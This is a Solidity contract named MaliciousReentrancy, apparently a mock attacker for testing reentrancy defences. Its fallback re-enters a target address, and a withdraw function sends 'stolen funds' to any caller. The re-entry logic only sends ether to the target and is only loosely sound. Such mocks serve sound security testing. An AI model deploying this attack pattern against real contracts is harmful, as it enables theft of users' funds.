// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract MaliciousReentrancy {
    address payable public target;
    uint256 public attackValue;

    constructor(address _target) {
        require(_target != address(0), "Invalid target address");
        target = payable(_target); // Convert internally
    }

    // Fallback function to execute reentrancy
    fallback() external payable {
        if (address(target).balance >= attackValue) {
            // Re-enter the target contract
            (bool success,) = target.call{ value: attackValue }("");
            require(success, "Reentrancy failed");
        }
    }

    // Receive function to handle direct Ether transfers
    receive() external payable { }

    // Attack initiation function
    function initiateAttack(uint256 _attackValue) external payable {
        require(msg.value >= _attackValue, "Insufficient attack funds");
        attackValue = _attackValue;

        // Initial call to the target contract
        (bool success,) = target.call{ value: _attackValue }("");
        require(success, "Initial attack failed");
    }

    // Withdraw stolen funds
    function withdraw() external {
        (bool success,) = payable(msg.sender).call{ value: address(this).balance }("");
        require(success, "Withdraw failed");
    }
}
